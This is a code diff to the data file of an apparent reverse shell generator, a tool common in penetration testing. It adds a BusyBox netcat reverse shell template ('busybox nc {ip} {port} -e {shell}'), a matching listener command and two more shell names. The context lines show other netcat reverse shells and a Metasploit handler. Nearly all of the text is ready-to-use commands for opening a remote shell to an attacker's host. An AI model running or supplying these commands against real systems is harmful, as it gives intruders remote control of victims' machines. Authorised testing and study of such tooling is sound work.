@@ -61,6 +61,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["windows"]
         },
         {
+            "name": "BusyBox nc -e",
+            "command": "busybox nc {ip} {port} -e {shell}",
+            "meta": ["linux"]
+        },
+        {
             "name": "nc -c",
             "command": "nc -c {shell} {ip} {port}",
             "meta": ["linux", "mac"]
@@ -455,6 +460,7 @@ const rsgData = {
 
     listenerCommands: [
         ['nc', 'nc -lvnp {port}'],
+		  ['busybox nc', 'busybox nc -lp {port}'],
         ['ncat', 'ncat -lvnp {port}'],
         ['ncat.exe', 'ncat.exe -lvnp {port}'],
         ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
@@ -469,7 +475,7 @@ const rsgData = {
         ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
     ],
 
-    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
+    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],
 
     upgrade: ['python', ],
 
